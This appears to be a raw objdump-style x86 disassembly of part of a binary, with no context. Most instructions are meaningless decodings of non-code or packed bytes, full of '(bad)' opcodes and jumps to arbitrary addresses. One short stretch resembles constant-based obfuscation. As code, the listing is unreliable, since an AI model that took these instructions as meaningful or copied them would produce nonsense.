  40bae1:	cmp    edi,DWORD PTR [ebx+0x46]
  40bae4:	xor    BYTE PTR [edi-0x10],al
  40bae7:	cs pop ebx
  40bae9:	jmp    0x40bb1a
  40baeb:	std    
  40baec:	fwait
  40baed:	sub    DWORD PTR [esp+esi*4],edi
  40baf0:	int3   
  40baf1:	adc    ch,al
  40baf3:	fs pop ebx
  40baf5:	push   ebx
  40baf6:	mov    si,0x6366
  40bafa:	jge    0x40ba99
  40bafc:	push   es
  40bafd:	jno    0x40bb41
  40baff:	cmp    dh,bl
  40bb01:	xor    eax,0x4aafd42c
  40bb06:	inc    BYTE PTR [ebx+0x779edad5]
  40bb0c:	add    BYTE PTR [edi+0x3845ad5b],bh
  40bb12:	or     ecx,DWORD PTR [ecx+ecx*2]
  40bb15:	xor    esi,DWORD PTR [edx-0x581e11e4]
  40bb1b:	push   ss
  40bb1c:	mov    DWORD PTR [esi],ebp
  40bb1e:	jns    0x40bb1a
  40bb20:	sbb    al,0x12
  40bb22:	dec    eax
  40bb23:	iret   
  40bb24:	mov    edi,0x1e99dc5b
  40bb29:	(bad)  
  40bb2a:	je     0x40bb81
  40bb2c:	daa    
  40bb2d:	cmp    al,0xf7
  40bb2f:	push   cs
  40bb30:	int3   
  40bb31:	outs   dx,DWORD PTR ds:[esi]
  40bb32:	dec    ebp
  40bb33:	sbb    DWORD PTR [eax-0x25],ecx
  40bb36:	mov    ebp,0x5ea8d65a
  40bb3b:	add    al,0xc0
  40bb3d:	popf   
  40bb3e:	je     0x40bb12
  40bb40:	dec    ebx
  40bb41:	add    esp,DWORD PTR [eax+ebp*4+0x2f25e269]
  40bb48:	and    bl,dl
  40bb4a:	add    ebp,ebp
  40bb4c:	leave  
  40bb4d:	sar    esi,cl
  40bb4f:	popa   
  40bb50:	es std 
  40bb52:	cdq    
  40bb53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb54:	push   0xc
  40bb56:	adc    DWORD PTR [ecx-0x15],esi
  40bb59:	rol    esi,0xb7
  40bb5c:	adc    DWORD PTR [ecx-0x4b1f62f1],esp
  40bb62:	pop    ebx
  40bb63:	and    dh,BYTE PTR [esp+edx*4+0x7d2f6dbe]
  40bb6a:	icebp  
  40bb6b:	xchg   ebx,eax
  40bb6c:	pop    ds
  40bb6d:	rcr    DWORD PTR [ecx+0x67],0x4c
  40bb71:	int    0x34
  40bb73:	push   0xffffffc5
  40bb75:	fild   DWORD PTR [ebx-0x74f0f5ed]
  40bb7b:	test   al,0x0
  40bb7d:	out    0x72,al
  40bb7f:	jl     0x40bb2c
  40bb81:	mov    dh,0x2e
  40bb83:	test   BYTE PTR [edx],dh
  40bb85:	popf   
  40bb86:	loope  0x40bba9
  40bb88:	sub    eax,0x81c20a46
  40bb8d:	iret   
  40bb8e:	ins    DWORD PTR es:[edi],dx
  40bb8f:	outs   dx,BYTE PTR ds:[esi]
  40bb90:	fsubr  QWORD PTR [esi]
  40bb92:	mov    esp,0xfd12f51a
  40bb97:	lea    esp,[esi-0x6f64aa6]
  40bb9d:	repnz dec eax
  40bb9f:	mov    cl,0xd
  40bba1:	iret   
  40bba2:	(bad)  
  40bba3:	lock dec esi
  40bba5:	fisttp QWORD PTR [ebx+0x37b6cbee]
  40bbab:	into   
  40bbac:	inc    ebx
  40bbad:	jmp    0x40bbbf
  40bbaf:	mov    WORD PTR [edx+edx*8],ds
  40bbb2:	pop    ds
  40bbb3:	xor    DWORD PTR [edi+0x4b],0x7a
  40bbb7:	stc    
  40bbb8:	push   esp
  40bbb9:	cs xchg edi,eax
  40bbbb:	jae    0x40bbff
  40bbbd:	imul   ebp,DWORD PTR [ecx],0xa58baf88
  40bbc3:	xchg   esi,eax
  40bbc4:	stos   BYTE PTR es:[edi],al
  40bbc5:	xor    ebp,DWORD PTR [eax+ebp*8]
  40bbc8:	or     al,0x2c
  40bbca:	sub    BYTE PTR [eax+0x51ea8348],0x4d
  40bbd1:	push   esi
  40bbd2:	inc    eax
  40bbd3:	add    ch,bh
  40bbd5:	jnp    0x40bb66
  40bbd7:	inc    esi
  40bbd8:	clc    
  40bbd9:	mov    dl,0x8c
  40bbdb:	mov    ecx,0x910041dc
  40bbe0:	mov    ebx,0x4526a944
  40bbe5:	xor    bl,ch
  40bbe7:	push   es
  40bbe8:	and    DWORD PTR [esi+0x62d6795b],ebp
  40bbee:	test   DWORD PTR [esp+ebx*2+0x2d],eax
  40bbf2:	and    BYTE PTR [ebx-0x11],bl
  40bbf5:	scas   eax,DWORD PTR es:[edi]
  40bbf6:	cli    
  40bbf7:	mov    eax,0xac0ecb88
  40bbfc:	jg     0x40bc69
  40bbfe:	sbb    DWORD PTR [ecx],0xffffff9a
  40bc01:	pop    edi
  40bc02:	ds dec edx
  40bc04:	xchg   edx,eax
  40bc05:	pop    esp
  40bc06:	or     dl,BYTE PTR [ecx]
  40bc08:	into   
  40bc09:	or     eax,DWORD PTR [ebp+0x53]
  40bc0c:	inc    edi
  40bc0d:	into   
  40bc0e:	dec    edi
  40bc0f:	ds mov edi,0x4b409938
  40bc15:	pop    es
  40bc16:	mov    dl,BYTE PTR [edx]
  40bc18:	stos   BYTE PTR es:[edi],al
  40bc19:	shr    DWORD PTR [ecx-0x72],cl
  40bc1c:	call   0xab00:0x65377c3c
  40bc23:	je     0x40bc2a
  40bc25:	xchg   ebx,eax
  40bc26:	neg    DWORD PTR [esi-0x6b]
  40bc29:	test   eax,0x929aff45
  40bc2e:	jns    0x40bbf9
  40bc30:	ins    DWORD PTR es:[edi],dx
  40bc31:	pusha  
  40bc32:	fisttp QWORD PTR [edx]
  40bc34:	xchg   ebp,eax
  40bc35:	ret    0xf167
  40bc38:	dec    ecx
  40bc39:	sbb    edi,DWORD PTR [ebp+0x30]
  40bc3c:	push   ecx
  40bc3d:	pop    ds
  40bc3e:	stc    
  40bc3f:	xchg   esi,eax
  40bc40:	adc    eax,0x31
  40bc43:	push   eax
  40bc44:	or     esp,ebx
  40bc46:	pop    es
  40bc47:	sbb    DWORD PTR [eax+0x3f],ecx
  40bc4a:	mov    eax,ds:0xf1cbd719
  40bc4f:	out    dx,al
  40bc50:	(bad)  
  40bc51:	(bad)  
  40bc52:	not    DWORD PTR [esp+eax*4+0x32]
  40bc56:	gs pop edx
  40bc58:	aas    
  40bc59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5a:	in     al,0xe4
  40bc5c:	xchg   esi,eax
  40bc5d:	jge    0x40bc24
  40bc5f:	cmp    eax,0x2355850e
  40bc64:	xchg   ecx,eax
  40bc65:	aaa    
  40bc66:	mov    dl,0x71
  40bc68:	sti    
  40bc69:	ss inc eax
  40bc6b:	or     ebx,DWORD PTR [edi-0x4f]
  40bc6e:	imul   BYTE PTR [edi+0x22e3acf9]
  40bc74:	shr    edx,cl
  40bc76:	jo     0x40bc3c
  40bc78:	xor    bh,ah
  40bc7a:	add    DWORD PTR [ecx],eax
  40bc7c:	shr    BYTE PTR [edi+0x2a3cfea0],cl
  40bc82:	enter  0x85f8,0xc7
  40bc86:	push   ecx
  40bc87:	xchg   ebx,eax
  40bc88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc89:	pushf  
  40bc8a:	xchg   ebx,eax
  40bc8b:	cwde   
  40bc8c:	jbe    0x40bcb1
  40bc8e:	push   eax
  40bc8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc90:	stos   BYTE PTR es:[edi],al
  40bc91:	scas   eax,DWORD PTR es:[edi]
  40bc92:	and    DWORD PTR [ebp+0x2f35d4ee],esi
  40bc98:	sub    al,0x4f
  40bc9a:	dec    esi
  40bc9b:	inc    edx
  40bc9c:	dec    esp
  40bc9d:	pop    eax
  40bc9e:	cmovle esp,DWORD PTR [esi+0x41500790]
  40bca5:	mov    edi,0xfd3c731a
  40bcaa:	xchg   ebp,eax
  40bcab:	xchg   esp,eax
  40bcac:	add    ebx,DWORD PTR [eax+eiz*8]
  40bcaf:	test   al,0x20
  40bcb1:	stc    
  40bcb2:	sub    eax,0x3f4d2c42
  40bcb7:	cmp    BYTE PTR [ecx+0x3b],bh
  40bcba:	mov    dl,0xbe
  40bcbc:	ds and esp,ebp
  40bcbf:	jnp    0x40bcb9
  40bcc1:	addr16 mul dh
  40bcc4:	dec    ecx
  40bcc5:	push   ecx
  40bcc6:	dec    eax
  40bcc7:	call   0x2d1bb3fd
  40bccc:	xchg   ebp,eax
  40bccd:	sbb    BYTE PTR [ebx+eiz*8-0x72],dl
  40bcd1:	mov    al,ds:0x539d4eab
  40bcd6:	dec    ebp
  40bcd7:	or     ah,BYTE PTR [esi+0x13]
  40bcda:	(bad)  
  40bcdb:	test   BYTE PTR [edx+edi*4],dh
  40bcde:	pop    ebx
  40bcdf:	cli    
  40bce0:	jl     0x40bc96
  40bce2:	pusha  
  40bce3:	cwde   
  40bce4:	push   ss
  40bce5:	pop    ds
  40bce6:	out    0x45,eax
  40bce8:	lods   eax,DWORD PTR ds:[esi]
  40bce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcea:	lods   al,BYTE PTR ds:[esi]
  40bceb:	call   0xb35b:0xa86126fb
  40bcf2:	xchg   edx,eax
  40bcf3:	mov    ebx,0xdb986c48
  40bcf8:	out    dx,eax
  40bcf9:	add    edx,ecx
  40bcfb:	xor    eax,0xf6d41d9a
  40bd00:	and    ecx,ebx
  40bd02:	cs stc 
  40bd04:	mov    ch,0xce
  40bd06:	mov    BYTE PTR [eax],cl
  40bd08:	(bad)  
  40bd09:	rol    DWORD PTR [esi-0x65925ac3],cl
  40bd0f:	sub    ch,BYTE PTR ds:0x7b2602da
  40bd15:	stos   DWORD PTR es:[edi],eax
  40bd16:	add    al,0xe1
  40bd18:	cmp    al,0xae
  40bd1a:	adc    al,0xd4
  40bd1c:	out    0x6e,al
  40bd1e:	push   esi
  40bd1f:	adc    BYTE PTR [eax-0x2a],0xee
  40bd23:	push   ecx
  40bd24:	adc    BYTE PTR [ebp-0x6c165c48],ch
  40bd2a:	mov    esp,0x68bfaf74
  40bd2f:	mov    al,bl
  40bd31:	pop    ecx
  40bd32:	inc    ebx
  40bd33:	push   ebp
  40bd34:	cli    
  40bd35:	hlt    
  40bd36:	adc    ebx,ecx
  40bd38:	mov    cl,0x1f
  40bd3a:	mov    ebp,0xeb1830
  40bd3f:	cmp    ebx,DWORD PTR [ecx+0x7eb5567d]
  40bd45:	in     al,dx
  40bd46:	push   ss
  40bd47:	xor    DWORD PTR [ebp+eax*2+0x20],eax
  40bd4b:	mov    bl,0x7f
  40bd4d:	in     eax,dx
  40bd4e:	rcr    BYTE PTR [ebx],1
  40bd50:	xchg   DWORD PTR cs:[esi+0x53],ebx
  40bd54:	pop    ss
  40bd55:	push   ebp
  40bd56:	inc    edi
  40bd57:	dec    edx
  40bd58:	dec    ebp
  40bd59:	in     eax,dx
  40bd5a:	dec    edx
  40bd5b:	test   eax,0x7c01952a
  40bd60:	pushf  
  40bd61:	fs hlt 
  40bd63:	cmp    BYTE PTR ds:0x46d9794b,0x28
  40bd6a:	xor    BYTE PTR [ebp-0x3c2320fa],bl
  40bd70:	loope  0x40bd40
  40bd72:	and    al,0x2e
  40bd74:	xor    BYTE PTR [edx],ah
  40bd76:	sub    DWORD PTR [esi+0x58],0xfffffff8
  40bd7a:	sub    dl,BYTE PTR [ebx-0x727b655b]
  40bd80:	sbb    al,dh
  40bd82:	cmc    
  40bd83:	mov    ch,0xcd
  40bd85:	fbld   TBYTE PTR [ebp+0x62320451]
  40bd8b:	fild   DWORD PTR [ebx+ebx*4+0x682dade1]
  40bd92:	es mov eax,edi
  40bd95:	sbb    eax,DWORD PTR [edx]
  40bd97:	and    edi,DWORD PTR [ecx]
  40bd99:	mov    edi,0xdd0051f5
  40bd9e:	inc    ecx
  40bd9f:	fwait
  40bda0:	lea    eax,[eax]
  40bda2:	push   ds
  40bda3:	jle    0x40bdac
  40bda5:	mov    eax,ds:0x9cca8596
  40bdaa:	sbb    BYTE PTR [edx-0x4b],bl
  40bdad:	xchg   edx,eax
  40bdae:	cmp    BYTE PTR [eax+0x52],dl
  40bdb1:	xchg   edi,eax
  40bdb2:	aaa    
  40bdb3:	out    0x41,al
  40bdb5:	push   edi
  40bdb6:	fstp   DWORD PTR [edx+eiz*1]
  40bdb9:	xlat   BYTE PTR ds:[ebx]
  40bdba:	or     dh,bh
  40bdbc:	or     eax,0x9b3f9015
  40bdc1:	pop    ds
  40bdc2:	std    
  40bdc3:	push   ebp
  40bdc4:	dec    edx
  40bdc5:	aad    0x55
  40bdc7:	or     al,0x35
  40bdc9:	jge    0x40be2f
  40bdcb:	dec    esp
  40bdcc:	ret    0x8ca2
  40bdcf:	sbb    DWORD PTR [ebp-0x40],ebp
  40bdd2:	push   eax
  40bdd3:	push   ebp
  40bdd4:	mov    edi,0xe8f0fd8e
  40bdd9:	add    BYTE PTR [edx+0x3e3bfba4],0x14
  40bde0:	icebp  
  40bde1:	(bad)  
  40bde2:	jmp    0x76ee167c
  40bde7:	inc    edi
  40bde8:	call   0xd093dfbc
  40bded:	sbb    edx,DWORD PTR [esi+0x3eeafc2d]
  40bdf3:	push   ds
  40bdf4:	popa   
  40bdf5:	je     0x40be6d
  40bdf7:	cmp    ecx,DWORD PTR [edi]
  40bdf9:	mov    ebx,0xcf91bbd0
  40bdfe:	mov    ch,0xc3
  40be00:	mov    ds:0x960e5ada,eax
  40be05:	sub    al,0x16
  40be07:	dec    ecx
  40be08:	scas   eax,DWORD PTR es:[edi]
  40be09:	out    0x74,al
  40be0b:	enter  0x3c59,0xfd
  40be0f:	nop
  40be10:	pop    ebx
  40be11:	cmp    eax,0xc1419051
  40be16:	in     al,0x51
  40be18:	in     al,0xc3
  40be1a:	addr16 ret 
  40be1c:	jg     0x40be20
  40be1e:	sub    al,0xc3
  40be20:	out    dx,eax
  40be21:	xchg   BYTE PTR [eax+0x6],ch
  40be24:	mov    BYTE PTR ds:0x3ed62b3d,bh
  40be2a:	mov    BYTE PTR [edi+0x322c069d],dl
  40be30:	fwait
  40be31:	xchg   DWORD PTR [ebx],edx
  40be33:	xlat   BYTE PTR ds:[ebx]
  40be34:	mov    DWORD PTR [edi-0x5f01565d],eax
  40be3a:	pushf  
  40be3b:	pop    eax
  40be3c:	jmp    0x2086:0xc6de15f
  40be43:	idiv   DWORD PTR [ebx+0x3176baed]
  40be49:	leave  
  40be4a:	in     eax,dx
  40be4b:	sti    
  40be4c:	dec    ebx
  40be4d:	cmp    bl,BYTE PTR [eax-0x2eb3fcf8]
  40be53:	or     eax,0x965e3841
  40be58:	dec    esi
  40be59:	pop    ecx
  40be5a:	cmp    BYTE PTR [esi-0x1a41455a],bl
  40be60:	cld    
  40be61:	mov    ds:0xc6fcb02f,eax
  40be66:	(bad)  
  40be67:	sbb    al,0xc3
  40be69:	(bad)  
  40be6a:	jmp    0x40be06
  40be6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be6d:	(bad)  
  40be6e:	es test DWORD PTR es:[esi],esp
  40be72:	cdq    
  40be73:	rol    DWORD PTR gs:[ecx+0x4],cl
  40be77:	jp     0x40bef0
  40be79:	push   es
  40be7a:	push   ds
  40be7b:	adc    eax,0x4b262869
  40be80:	out    dx,al
  40be81:	test   eax,0x28d04f0f
  40be86:	loope  0x40bef5
  40be88:	mov    DWORD PTR [ebp-0xc],ecx
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf36
  40bf55:	push   esp
  40bf56:	mov    DWORD PTR [esi+esi*4+0x5],edi
  40bf5a:	sbb    BYTE PTR [eax],bl
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    BYTE PTR [esi-0x14],bl
  40bf62:	iret   
  40bf63:	fmulp  st(3),st
  40bf65:	push   esp
  40bf66:	sbb    ch,BYTE PTR [edx-0x3a]
  40bf69:	inc    edi
  40bf6a:	or     eax,0x90274c4
  40bf6f:	dec    ebx
  40bf70:	leave  
  40bf71:	xor    bh,BYTE PTR ss:[esi-0x1f5306c8]
  40bf78:	popf   
  40bf79:	lock and DWORD PTR [ebx+0x66],0xffffffa5
  40bf7e:	mov    eax,0xa787bb33
  40bf83:	and    ch,ch
  40bf85:	pushf  
  40bf86:	dec    ecx
  40bf87:	xor    DWORD PTR [esi+0x61c7dd1d],esi
  40bf8d:	in     al,0xac
  40bf8f:	lahf   
  40bf90:	lods   al,BYTE PTR ds:[esi]
  40bf91:	jge    0x40bfbb
  40bf93:	outs   dx,DWORD PTR ds:[esi]
  40bf94:	xchg   BYTE PTR [edx+edx*4],al
  40bf97:	inc    edi
  40bf98:	mov    ?,edx
  40bf9a:	sbb    eax,0xd257b6b9
  40bf9f:	shl    ebx,1
  40bfa1:	fld    TBYTE PTR [ecx]
  40bfa3:	je     0x40bf9a
  40bfa5:	pusha  
  40bfa6:	stos   BYTE PTR es:[edi],al
  40bfa7:	xchg   edx,eax
  40bfa8:	test   eax,0x72d0b6c7
  40bfad:	jae    0x40bfac
  40bfaf:	pop    es
  40bfb0:	bound  ecx,QWORD PTR [ecx-0x2f]
  40bfb3:	fisttp DWORD PTR [edx+0x4d]
  40bfb6:	xlat   BYTE PTR ds:[ebx]
  40bfb7:	and    bl,al
  40bfb9:	push   eax
  40bfba:	call   0xb507f276
  40bfbf:	pop    edi
  40bfc0:	cld    
  40bfc1:	nop
  40bfc2:	(bad)  
  40bfc4:	ins    BYTE PTR es:[edi],dx
  40bfc5:	add    edi,esi
  40bfc7:	daa    
  40bfc8:	sub    dl,ah
  40bfca:	inc    ebx
  40bfcb:	sbb    dl,BYTE PTR [ecx]
  40bfcd:	jae    0x40c01b
  40bfcf:	and    bl,dl
  40bfd1:	fwait
  40bfd2:	sti    
  40bfd3:	xchg   BYTE PTR [edi],dl
  40bfd5:	push   edx
  40bfd6:	or     ecx,edx
  40bfd8:	adc    eax,0x86997145
  40bfdd:	sti    
  40bfde:	pop    ecx
  40bfdf:	pop    es
  40bfe0:	push   ebp
  40bfe1:	dec    esi
  40bfe2:	ds popf 
  40bfe4:	test   DWORD PTR [edx+eiz*2-0x3d],ebp
  40bfe8:	fdivr  QWORD PTR [esi]
  40bfea:	call   0x997f2a19
  40bfef:	ret    0xef7d
  40bff2:	xchg   edi,eax
  40bff3:	ret    0xca00
  40bff6:	dec    ebx
  40bff7:	stc    
  40bff8:	arpl   WORD PTR [ecx+0x2d],bp
  40bffb:	and    BYTE PTR [ebp+0x6d9086bb],0x59
  40c002:	test   eax,0xbaca741b
  40c007:	ss (bad) 
  40c009:	cmp    DWORD PTR [ebx],ebx
  40c00b:	adc    BYTE PTR [ebx-0x2f],ah
  40c00e:	cmc    
  40c00f:	xchg   BYTE PTR [edi+0x60db8b83],bh
  40c015:	jmp    0x40c000
  40c017:	jg     0x40bffd
  40c019:	push   0xd42885ee
  40c01e:	loope  0x40c07d
  40c020:	ss ret 
  40c022:	and    al,0x1c
  40c024:	lods   eax,DWORD PTR ds:[esi]
  40c025:	mov    DWORD PTR [ecx],0x83c54f92
  40c02b:	sbb    DWORD PTR [ebp-0x2ef097cd],edi
  40c031:	mov    bl,0xf5
  40c033:	(bad)  
  40c034:	popa   
  40c035:	adc    esp,DWORD PTR [edi+0x52]
  40c038:	test   eax,0xf44a2745
  40c03d:	popa   
  40c03e:	cmp    bh,BYTE PTR [eax+0x16]
  40c041:	cmpxchg BYTE PTR [ebx+0x34c28737],bh
  40c048:	sbb    eax,0x30bd20bc
  40c04d:	daa    
  40c04e:	cld    
  40c04f:	dec    ebx
  40c050:	jp     0x40bfd3
  40c052:	popa   
  40c053:	aas    
  40c054:	fadd   DWORD PTR [ebx+edx*4+0x2e]
  40c058:	xchg   ebx,eax
  40c059:	adc    edx,DWORD PTR [ebx]
  40c05b:	mov    ds:0xaf0263ff,eax
  40c060:	inc    edi
  40c061:	or     eax,0x478ed2
  40c066:	and    edx,DWORD PTR [edi+0x1eba1d13]
  40c06c:	mov    WORD PTR [edx+edx*8+0x1bdbf5b9],cs
  40c073:	xor    al,0x80
  40c075:	loop   0x40c0c0
  40c077:	mov    DWORD PTR [edi],0x90c3261c
  40c07d:	jno    0x40c082
  40c07f:	or     eax,0x20e8f09a
  40c084:	add    al,BYTE PTR [ebp+0x5d180edc]
  40c08a:	out    dx,eax
  40c08b:	dec    esp
  40c08c:	(bad)  
  40c08d:	sbb    al,0x7d
  40c08f:	js     0x40c108
  40c091:	xchg   BYTE PTR [eax+0x546d14f9],dl
  40c097:	xchg   edi,eax
  40c098:	xchg   esi,eax
  40c099:	pop    edi
  40c09a:	fs dec ebp
  40c09c:	jmp    0x130d3a09
  40c0a1:	mov    ecx,0x33c26b00
  40c0a6:	ficomp DWORD PTR [ebp-0x57dd0454]
  40c0ac:	jmp    0x40c0ab
  40c0ae:	sti    
  40c0af:	xchg   al,cl
  40c0b1:	sub    eax,0xb1f0a916
  40c0b6:	sub    al,0x1f
  40c0b8:	mov    fs,WORD PTR [ecx+0xe493b2]
  40c0be:	xchg   esi,eax
  40c0bf:	xor    bh,dl
  40c0c1:	cmp    ebp,0x7d
  40c0c4:	inc    edi
  40c0c5:	jne    0x40c05c
  40c0c7:	and    al,BYTE PTR [ebp-0x40fd0bb9]
  40c0cd:	push   eax
  40c0ce:	(bad)  
  40c0cf:	inc    BYTE PTR [esi+0x616e6fcd]
  40c0d5:	mov    edx,0x646ff34c
  40c0da:	and    cx,WORD PTR [eax-0x40]
  40c0de:	cdq    
  40c0df:	mov    bh,0x82
  40c0e1:	adc    BYTE PTR [edx+0x2a],ah
  40c0e4:	add    al,0xd5
  40c0e6:	dec    esp
  40c0e7:	mov    dh,bh
  40c0e9:	leave  
  40c0ea:	outs   dx,BYTE PTR ds:[esi]
  40c0eb:	fdiv   QWORD PTR [ebp+0x329f96ce]
  40c0f1:	jno    0x40c0b3
  40c0f3:	or     BYTE PTR [edx-0xb],dh
  40c0f6:	jg     0x40c107
  40c0f8:	stc    
  40c0f9:	(bad)  
  40c0fa:	fcom   QWORD PTR ds:[ecx+0x5e]
  40c0fe:	std    
  40c0ff:	jle    0x40c0c2
  40c101:	mov    ?,edx
  40c103:	test   BYTE PTR [esi],0x73
  40c106:	push   ebx
  40c107:	sti    
  40c108:	xchg   edi,eax
  40c109:	push   cs
  40c10a:	cmp    eax,0xe8d2ce50
  40c10f:	or     al,0x64
  40c111:	aam    0xb5
  40c113:	sub    BYTE PTR [ebx],dh
  40c115:	inc    ebx
  40c116:	(bad)  
  40c117:	mov    ebp,ds
  40c119:	jmp    0xe689:0x6efef380
  40c120:	dec    ebx
  40c121:	mov    ecx,0x9b806ff
  40c126:	inc    esi
  40c127:	sbb    DWORD PTR [ecx],0xffffffef
  40c12a:	(bad)  
  40c12c:	sbb    BYTE PTR [ecx-0x12],0x76
  40c130:	or     eax,0xc631e9f9
  40c135:	sub    ebp,esi
  40c137:	cmp    eax,0x9aa58922
  40c13c:	jmp    0x40c170
  40c13e:	sbb    cl,BYTE PTR [ebx]
  40c140:	dec    ebp
  40c141:	gs add eax,esi
  40c144:	shl    BYTE PTR [edi],1
  40c146:	loopne 0x40c0fc
  40c148:	mov    ch,0x71
  40c14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c14b:	pop    es
  40c14c:	and    ebx,edi
  40c14e:	nop
  40c14f:	mov    ds:0xd0041250,eax
  40c154:	inc    ecx
  40c155:	sbb    BYTE PTR ds:0x546940eb,0x52
  40c15c:	aam    0x26
  40c15e:	adc    edx,DWORD PTR [edx+0x57]
  40c161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c162:	xor    al,0xbf
  40c164:	fldenv [ebx-0x5abd3fbc]
  40c16a:	pop    ecx
  40c16b:	mov    edi,0x1db3bbab
  40c170:	adc    al,0x87
  40c172:	dec    ecx
  40c173:	(bad)  
  40c174:	test   dh,0xdf
  40c177:	push   es
  40c178:	mov    DWORD PTR [eax],ecx
  40c17a:	mov    dh,0x17
  40c17c:	into   
  40c17d:	xchg   esi,eax
  40c17e:	sbb    eax,0xde933cb0
  40c183:	xchg   ebp,eax
  40c184:	and    DWORD PTR [ebx+0x7d],eax
  40c187:	or     DWORD PTR [edi],edi
  40c189:	into   
  40c18a:	mov    ebp,0xfc5212d7
  40c18f:	rol    DWORD PTR [ecx],1
  40c191:	scas   al,BYTE PTR es:[edi]
  40c192:	test   eax,0xd512bdb7
  40c197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c198:	ins    BYTE PTR es:[edi],dx
  40c199:	mov    ch,0x8a
  40c19b:	or     DWORD PTR [ebp+esi*1-0x51],edx
  40c19f:	outs   dx,DWORD PTR ds:[esi]
  40c1a0:	inc    ebx
  40c1a1:	push   0x26a121e9
  40c1a6:	or     eax,0xe5a16a2b
  40c1ab:	xchg   DWORD PTR [eax+eax*4],ecx
  40c1ae:	call   ebx
  40c1b0:	fcom   DWORD PTR [edx]
  40c1b2:	xor    BYTE PTR [edx-0x7f],ah
  40c1b5:	xor    eax,0x5fdb4ca6
  40c1ba:	test   eax,0x94a2559e
  40c1bf:	in     eax,0x2a
  40c1c1:	jbe    0x40c1a3
  40c1c3:	arpl   WORD PTR [ebx],sp
  40c1c5:	icebp  
  40c1c6:	(bad)  
  40c1c7:	sub    ebp,edx
  40c1c9:	mov    cl,0x4e
  40c1cb:	mov    eax,0xa75df5eb
  40c1d0:	(bad)  
  40c1d1:	pop    ebp
  40c1d2:	frstor [ecx+ebp*1+0x73e647b9]
  40c1d9:	mov    al,ds:0xfcf0d7d3
  40c1de:	dec    ebx
  40c1df:	das    
  40c1e0:	xchg   ecx,eax
  40c1e1:	push   esi
  40c1e2:	scas   al,BYTE PTR es:[edi]
  40c1e3:	pop    es
  40c1e4:	std    
  40c1e5:	outs   dx,BYTE PTR ds:[esi]
  40c1e6:	pop    es
  40c1e7:	xchg   BYTE PTR [esi-0x769c8909],cl
  40c1ed:	pop    edx
  40c1ee:	fnclex 
  40c1f0:	push   ecx
  40c1f1:	outs   dx,DWORD PTR ds:[esi]
  40c1f2:	dec    ecx
  40c1f3:	pop    ds
  40c1f4:	mov    edx,0x94f87404
  40c1f9:	leave  
  40c1fa:	mov    al,0x25
  40c1fc:	or     al,0xf8
  40c1fe:	leave  
  40c1ff:	xchg   ebx,eax
  40c200:	mov    al,0xc2
  40c202:	jg     0x40c189
  40c204:	pop    ss
  40c205:	idiv   DWORD PTR [esi+0x1fe7f556]
  40c20b:	jg     0x40c247
  40c20d:	(bad)  
  40c20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c20f:	hlt    
  40c210:	es int 0x84
  40c213:	and    eax,0xa5b2d57b
  40c218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c219:	shl    DWORD PTR [ecx-0x46ffd3bb],1
  40c21f:	fstp   DWORD PTR [ecx]
  40c221:	addr16 jge 0x40c215
  40c224:	clc    
  40c225:	mov    edx,0xa02eaf99
  40c22a:	jmp    0x19bef053
  40c22f:	sub    ch,ch
  40c231:	dec    ebx
  40c232:	dec    ebx
  40c233:	inc    ebp
  40c234:	call   0x14b5934
  40c239:	mov    eax,0x7339fb98
  40c23e:	xor    eax,0x67abc3ec
  40c243:	mov    eax,0x2a812bbb
  40c248:	loop   0x40c1e8
  40c24a:	push   ecx
  40c24b:	fmul   DWORD PTR [edi]
  40c24d:	jle    0x40c20d
  40c24f:	mov    dl,0x5a
